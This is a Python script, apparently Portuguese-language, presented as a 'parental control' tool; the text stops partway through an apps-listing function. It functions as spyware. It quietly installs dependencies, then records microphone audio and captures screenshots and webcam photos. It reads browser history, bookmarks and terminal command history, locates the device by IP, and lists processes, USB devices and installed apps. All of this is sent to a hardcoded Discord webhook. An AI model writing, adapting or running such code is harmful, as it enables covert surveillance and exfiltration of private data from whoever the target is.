#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CONTROLE PARENTAL - UNIVERSAL
Funciona no Google Colab, Windows e Linux
"""

# ==================== DETECÇÃO DE AMBIENTE ====================
import os
import sys

# Verifica se está no Google Colab
try:
    import google.colab
    NO_COLAB = True
    print("[*] Ambiente detectado: Google Colab")
except:
    NO_COLAB = False
    print("[*] Ambiente detectado: PC Local")

# ==================== INSTALAÇÃO DE DEPENDÊNCIAS ====================
import subprocess

def instalar(pacote):
    """Instala pacote silenciosamente."""
    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", "-q", pacote],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

print("\n[*] A verificar dependências...\n")

# Lista de dependências
DEPS = ["psutil", "pillow", "opencv-python", "sounddevice", "scipy", "numpy"]

for pacote in DEPS:
    try:
        if pacote == "pillow":
            __import__("PIL")
        elif pacote == "opencv-python":
            __import__("cv2")
        else:
            __import__(pacote.replace("-", "_"))
        print(f"    [OK] {pacote}")
    except ImportError:
        print(f"    [!!] A instalar {pacote}...")
        try:
            instalar(pacote)
            print(f"    [OK] {pacote} instalado!")
        except:
            print(f"    [--] {pacote} ignorado (opcional)")

print("\n[+] Dependências verificadas!\n")

# ==================== IMPORTS ====================
import time
import json
import platform
import shutil
from datetime import datetime
from pathlib import Path
from urllib.request import Request, urlopen

# Imports com tratamento de erro
try:
    import psutil
    TEM_PSUTIL = True
except:
    TEM_PSUTIL = False

try:
    from PIL import ImageGrab
    TEM_PIL = True
except:
    TEM_PIL = False

try:
    import cv2
    TEM_CV2 = True
except:
    TEM_CV2 = False

try:
    import sounddevice as sd
    import scipy.io.wavfile as wavfile
    import numpy as np
    TEM_AUDIO = True
except:
    TEM_AUDIO = False

try:
    import sqlite3
    TEM_SQLITE = True
except:
    TEM_SQLITE = False

# Windows específico
SISTEMA = platform.system()
if SISTEMA == "Windows":
    try:
        import winreg
        TEM_WINREG = True
    except:
        TEM_WINREG = False
else:
    TEM_WINREG = False

# ==================== CONFIGURAÇÕES ====================
HOME = str(Path.home())

if NO_COLAB:
    BASE_DIR = "/content/controle_parental"
else:
    BASE_DIR = os.path.join(HOME, "controle_parental")

LOG_DIR = os.path.join(BASE_DIR, "logs")
REPORT_DIR = os.path.join(BASE_DIR, "relatorios")
AUDIO_DIR = os.path.join(BASE_DIR, "audios")

MAX_LOG_AGE_DAYS = 7
INTERVALO_MINUTOS = 30
TEMPO_INICIO = time.time()

# ⚠️ SUBSTITUI PELO TEU WEBHOOK
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1459232383445500128/UysW7g1xigRBIHf1nSv7sjyZL-U6mCW5PGSSNyG-Us5HW4KDhOw1JZLT7O_V-W97fzxS"

# ==================== SETUP ====================
def setup():
    """Cria pastas necessárias."""
    for pasta in [LOG_DIR, REPORT_DIR, AUDIO_DIR]:
        os.makedirs(pasta, exist_ok=True)
    print(f"[+] Sistema: {SISTEMA}")
    print(f"[+] Colab: {'Sim' if NO_COLAB else 'Não'}")
    print(f"[+] Pastas: {BASE_DIR}")

# ==================== UTILITÁRIOS ====================
def timestamp():
    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

def executar_comando(cmd):
    """Executa comando com segurança."""
    try:
        if isinstance(cmd, str):
            cmd = cmd.split()
        result = subprocess.run(
            cmd, capture_output=True, text=True,
            encoding='utf-8', errors='ignore', timeout=30
        )
        return result.stdout.strip()
    except:
        return ""

# ==================== DISCORD ====================
def enviar_discord_texto(titulo, descricao):
    """Envia texto para Discord."""
    try:
        embed = {
            "embeds": [{
                "title": titulo,
                "description": descricao[:4000],
                "color": 3447003,
                "timestamp": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.000Z"),
                "footer": {"text": f"Controle Parental | {SISTEMA} | {'Colab' if NO_COLAB else 'PC'}"}
            }]
        }
        
        dados = json.dumps(embed).encode('utf-8')
        req = Request(DISCORD_WEBHOOK_URL, data=dados)
        req.add_header('Content-Type', 'application/json')
        req.add_header('User-Agent', 'Mozilla/5.0')
        
        response = urlopen(req, timeout=30)
        if response.status == 204:
            print("[+] Mensagem enviada ao Discord!")
            return True
        return False
    except Exception as e:
        print(f"[-] Erro Discord: {e}")
        return False

def enviar_discord_arquivo(arquivo, mensagem=""):
    """Envia arquivo para Discord."""
    try:
        if not os.path.exists(arquivo):
            return False
        
        boundary = f"----Boundary{int(time.time())}"
        
        with open(arquivo, "rb") as f:
            conteudo = f.read()
        
        nome = os.path.basename(arquivo)
        ext = nome.split('.')[-1].lower()
        
        tipos = {
            'png': 'image/png', 'jpg': 'image/jpeg', 'jpeg': 'image/jpeg',
            'wav': 'audio/wav', 'txt': 'text/plain; charset=utf-8'
        }
        content_type = tipos.get(ext, 'application/octet-stream')
        
        body = b''
        if mensagem:
            body += f'--{boundary}\r\n'.encode()
            body += b'Content-Disposition: form-data; name="content"\r\n\r\n'
            body += mensagem.encode('utf-8') + b'\r\n'
        
        body += f'--{boundary}\r\n'.encode()
        body += f'Content-Disposition: form-data; name="file"; filename="{nome}"\r\n'.encode()
        body += f'Content-Type: {content_type}\r\n\r\n'.encode()
        body += conteudo + b'\r\n'
        body += f'--{boundary}--\r\n'.encode()
        
        req = Request(DISCORD_WEBHOOK_URL, data=body)
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        req.add_header('User-Agent', 'Mozilla/5.0')
        
        response = urlopen(req, timeout=120)
        if response.status == 200:
            print(f"[+] Enviado: {nome}")
            return True
        return False
    except Exception as e:
        print(f"[-] Erro envio: {e}")
        return False

# ==================== SALVAR TXT ====================
def salvar_txt(nome, dados):
    """Salva dados em .txt"""
    try:
        ts = timestamp()
        arquivo = os.path.join(REPORT_DIR, f"{nome}_{ts}.txt")
        
        with open(arquivo, "w", encoding="utf-8") as f:
            f.write("=" * 60 + "\n")
            f.write(f"  {nome.upper()} - {ts}\n")
            f.write(f"  Sistema: {SISTEMA} | Colab: {NO_COLAB}\n")
            f.write("=" * 60 + "\n\n")
            
            for chave, valor in dados.items():
                f.write(f">> {chave.upper()}\n")
                f.write("-" * 40 + "\n")
                
                if isinstance(valor, list):
                    for i, item in enumerate(valor, 1):
                        f.write(f"  {i}. {item}\n")
                elif isinstance(valor, dict):
                    for k, v in valor.items():
                        f.write(f"  * {k}: {v}\n")
                else:
                    f.write(f"  {valor}\n")
                f.write("\n")
        
        print(f"[+] Salvo: {nome}_{ts}.txt")
        return arquivo
    except Exception as e:
        print(f"[-] Erro salvar: {e}")
        return None

# ==================== 1. TEMPO DE USO ====================
def obter_tempo_uso():
    """Tempo de uso."""
    try:
        tempo = time.time() - TEMPO_INICIO
        h = int(tempo // 3600)
        m = int((tempo % 3600) // 60)
        s = int(tempo % 60)
        
        resultado = {"sessao": f"{h}h {m}m {s}s"}
        
        if TEM_PSUTIL:
            boot = datetime.fromtimestamp(psutil.boot_time())
            uptime = datetime.now() - boot
            resultado["desde_boot"] = str(uptime).split('.')[0]
            resultado["hora_boot"] = boot.strftime("%Y-%m-%d %H:%M:%S")
        
        print(f"[+] Tempo: {resultado['sessao']}")
        return resultado
    except Exception as e:
        return {"erro": str(e)}

# ==================== 2. ÁUDIO ====================
def capturar_audio(duracao=10):
    """Grava áudio."""
    if NO_COLAB:
        print("[-] Áudio: não disponível no Colab")
        return None
    
    if not TEM_AUDIO:
        print("[-] Áudio: dependências não instaladas")
        return None
    
    try:
        ts = timestamp()
        arquivo = os.path.join(AUDIO_DIR, f"audio_{ts}.wav")
        
        print(f"[*] A gravar áudio ({duracao}s)...")
        
        audio = sd.rec(int(duracao * 44100), samplerate=44100, channels=1, dtype='int16')
        sd.wait()
        wavfile.write(arquivo, 44100, audio)
        
        print(f"[+] Áudio: {os.path.basename(arquivo)}")
        return arquivo
    except Exception as e:
        print(f"[-] Erro áudio: {e}")
        return None

# ==================== 5. USB ====================
def listar_usb():
    """Lista USB."""
    try:
        dispositivos = []
        
        if SISTEMA == "Windows":
            output = executar_comando(["wmic", "path", "Win32_USBHub", "get", "Name"])
            if output:
                dispositivos = [l.strip() for l in output.split('\n') if l.strip() and "Name" not in l]
        else:
            output = executar_comando(["lsusb"])
            if output:
                dispositivos = output.split('\n')
        
        dispositivos = [d for d in dispositivos if d][:30]
        print(f"[+] USB: {len(dispositivos)}")
        return dispositivos
    except Exception as e:
        print(f"[-] Erro USB: {e}")
        return []

# ==================== 6. LOCALIZAÇÃO ====================
def obter_localizacao():
    """Localização via IP."""
    try:
        req = Request("http://ip-api.com/json/")
        req.add_header('User-Agent', 'Mozilla/5.0')
        response = urlopen(req, timeout=10)
        dados = json.loads(response.read().decode())
        
        if dados.get("status") == "success":
            loc = {
                "ip": dados.get("query", "?"),
                "cidade": dados.get("city", "?"),
                "regiao": dados.get("regionName", "?"),
                "pais": dados.get("country", "?"),
                "isp": dados.get("isp", "?")
            }
            print(f"[+] Local: {loc['cidade']}, {loc['pais']}")
            return loc
        return {"erro": "Falha API"}
    except Exception as e:
        print(f"[-] Erro local: {e}")
        return {"erro": str(e)}

# ==================== 9. PROCESSOS ====================
def listar_processos():
    """Lista processos."""
    if not TEM_PSUTIL:
        print("[-] Processos: psutil não disponível")
        return []
    
    try:
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                info = p.info
                mem = info.get('memory_percent', 0) or 0
                if mem > 0.1:
                    procs.append(f"{info['name']} (PID:{info['pid']}) RAM:{mem:.1f}%")
            except:
                continue
        
        procs.sort(key=lambda x: float(x.split('RAM:')[1].replace('%', '')), reverse=True)
        print(f"[+] Processos: {len(procs[:50])}")
        return procs[:50]
    except Exception as e:
        print(f"[-] Erro procs: {e}")
        return []

# ==================== 10. TERMINAL ====================
def obter_historico_terminal():
    """Histórico do terminal."""
    if NO_COLAB:
        print("[-] Terminal: não disponível no Colab")
        return []
    
    try:
        comandos = []
        
        if SISTEMA == "Windows":
            paths = [os.path.join(HOME, "AppData", "Roaming", "Microsoft", "Windows", 
                    "PowerShell", "PSReadLine", "ConsoleHost_history.txt")]
        else:
            paths = [
                os.path.join(HOME, ".bash_history"),
                os.path.join(HOME, ".zsh_history")
            ]
        
        for path in paths:
            if os.path.exists(path):
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        linhas = f.readlines()[-100:]
                        comandos.extend([l.strip() for l in linhas if l.strip()])
                except:
                    pass
        
        print(f"[+] Comandos: {len(comandos)}")
        return comandos[-100:]
    except Exception as e:
        print(f"[-] Erro terminal: {e}")
        return []

# ==================== 12. SISTEMA ====================
def obter_info_sistema():
    """Info do sistema."""
    try:
        info = {
            "sistema": SISTEMA,
            "versao": platform.release(),
            "arquitetura": platform.machine(),
            "hostname": platform.node(),
            "python": platform.python_version(),
            "colab": "Sim" if NO_COLAB else "Não"
        }
        
        # Usuário
        try:
            info["usuario"] = os.getlogin()
        except:
            info["usuario"] = os.environ.get("USER", os.environ.get("USERNAME", "?"))
        
        if TEM_PSUTIL:
            # CPU
            info["cpu_nucleos"] = psutil.cpu_count()
            info["cpu_uso"] = f"{psutil.cpu_percent(interval=1)}%"
            
            # RAM
            mem = psutil.virtual_memory()
            info["ram_total"] = f"{mem.total / (1024**3):.1f} GB"
            info["ram_uso"] = f"{mem.percent}%"
            
            # Disco
            disco = psutil.disk_usage('/')
            info["disco_total"] = f"{disco.total / (1024**3):.1f} GB"
            info["disco_uso"] = f"{disco.percent}%"
            
            # Bateria
            bat = psutil.sensors_battery()
            if bat:
                info["bateria"] = f"{bat.percent}%"
                info["a_carregar"] = "Sim" if bat.power_plugged else "Não"
            else:
                info["bateria"] = "N/A"
        
        print("[+] Info sistema obtida")
        return info
    except Exception as e:
        print(f"[-] Erro sistema: {e}")
        return {"erro": str(e)}

# ==================== 15. FAVORITOS ====================
def obter_favoritos():
    """Favoritos do browser."""
    if NO_COLAB:
        print("[-] Favoritos: não disponível no Colab")
        return []
    
    try:
        favoritos = []
        
        if SISTEMA == "Windows":
            paths = [
                os.path.join(HOME, "AppData", "Local", "Google", "Chrome", 
                            "User Data", "Default", "Bookmarks"),
                os.path.join(HOME, "AppData", "Local", "Microsoft", "Edge",
                            "User Data", "Default", "Bookmarks")
            ]
        else:
            paths = [
                os.path.join(HOME, ".config", "google-chrome", "Default", "Bookmarks"),
                os.path.join(HOME, ".config", "chromium", "Default", "Bookmarks")
            ]
        
        def extrair(node):
            resultado = []
            if isinstance(node, dict):
                if node.get("type") == "url":
                    nome = node.get("name", "?")[:40]
                    url = node.get("url", "")[:50]
                    resultado.append(f"{nome} - {url}")
                for child in node.get("children", []):
                    resultado.extend(extrair(child))
            return resultado
        
        for path in paths:
            if os.path.exists(path):
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        dados = json.load(f)
                        for key in dados.get("roots", {}):
                            favoritos.extend(extrair(dados["roots"][key]))
                except:
                    pass
        
        favoritos = list(set(favoritos))[:100]
        print(f"[+] Favoritos: {len(favoritos)}")
        return favoritos
    except Exception as e:
        print(f"[-] Erro favoritos: {e}")
        return []

# ==================== CAPTURAS ====================
def capturar_tela():
    """Screenshot."""
    if NO_COLAB:
        print("[-] Screenshot: não disponível no Colab")
        return None
    
    if not TEM_PIL:
        print("[-] Screenshot: PIL não disponível")
        return None
    
    try:
        ts = timestamp()
        arquivo = os.path.join(REPORT_DIR, f"tela_{ts}.png")
        
        if SISTEMA == "Windows":
            img = ImageGrab.grab()
            img.save(arquivo)
        else:
            # Linux - tenta ferramentas
            for cmd in [["scrot", arquivo], ["gnome-screenshot", "-f", arquivo]]:
                try:
                    subprocess.run(cmd, capture_output=True, timeout=5)
                    if os.path.exists(arquivo):
                        break
                except:
                    continue
        
        if os.path.exists(arquivo):
            print(f"[+] Screenshot: {os.path.basename(arquivo)}")
            return arquivo
        return None
    except Exception as e:
        print(f"[-] Erro screenshot: {e}")
        return None

def capturar_camera():
    """Foto da câmera."""
    if NO_COLAB:
        print("[-] Câmera: não disponível no Colab")
        return None
    
    if not TEM_CV2:
        print("[-] Câmera: OpenCV não disponível")
        return None
    
    try:
        ts = timestamp()
        arquivo = os.path.join(REPORT_DIR, f"camera_{ts}.jpg")
        
        print("[*] A abrir câmera...")
        
        cap = None
        for i in range(3):
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                break
            cap.release()
        
        if not cap or not cap.isOpened():
            print("[-] Câmera não encontrada")
            return None
        
        time.sleep(2)
        
        for _ in range(5):
            ret, frame = cap.read()
        
        cap.release()
        
        if ret and frame is not None:
            cv2.imwrite(arquivo, frame)
            print(f"[+] Câmera: {os.path.basename(arquivo)}")
            return arquivo
        
        return None
    except Exception as e:
        print(f"[-] Erro câmera: {e}")
        return None

# ==================== HISTÓRICO NAVEGADOR ====================
def obter_historico_navegador():
    """Histórico do browser."""
    if NO_COLAB:
        print("[-] Histórico: não disponível no Colab")
        return []
    
    if not TEM_SQLITE:
        print("[-] Histórico: sqlite3 não disponível")
        return []
    
    try:
        historico = []
        
        if SISTEMA == "Windows":
            paths = [
                os.path.join(HOME, "AppData", "Local", "Google", "Chrome",
                            "User Data", "Default", "History"),
                os.path.join(HOME, "AppData", "Local", "Microsoft", "Edge",
                            "User Data", "Default", "History")
            ]
        else:
            paths = [
                os.path.join(HOME, ".config", "google-chrome", "Default", "History"),
                os.path.join(HOME, ".config", "chromium", "Default", "History")
            ]
        
        for db_path in paths:
            if os.path.exists(db_path):
                try:
                    temp = os.path.join(REPORT_DIR, f"temp_{int(time.time())}.db")
                    shutil.copy2(db_path, temp)
                    
                    conn = sqlite3.connect(temp)
                    cursor = conn.cursor()
                    cursor.execute("""
                        SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch')
                        FROM urls ORDER BY last_visit_time DESC LIMIT 100
                    """)
                    
                    for url, titulo, data in cursor.fetchall():
                        historico.append(f"[{data}] {(titulo or '?')[:35]} - {url[:50]}")
                    
                    conn.close()
                    os.remove(temp)
                except:
                    pass
        
        print(f"[+] Histórico: {len(historico)}")
        return historico[:100]
    except Exception as e:
        print(f"[-] Erro histórico: {e}")
        return []

# ==================== APPS ====================
def obter_apps():
    """Apps instaladas."""
    if NO_COLAB:
        print("[-] Apps: não disponível no Colab")
        return []
    
    try:
        apps = []
        
        if SISTEMA == "Windows" and TEM_WINREG:
            paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            
            for path in paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey = winreg.OpenKey(key, winreg.EnumKey(key, i))
                            nome = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if nome:
                                apps.append(nome)
                        except:
                            pass
                except:
                    pass
        else:
            # Linux
            output = executar_comando(["dpkg", "--get-selections"])
            if output:
                for linha in output.split('\n'):
                  
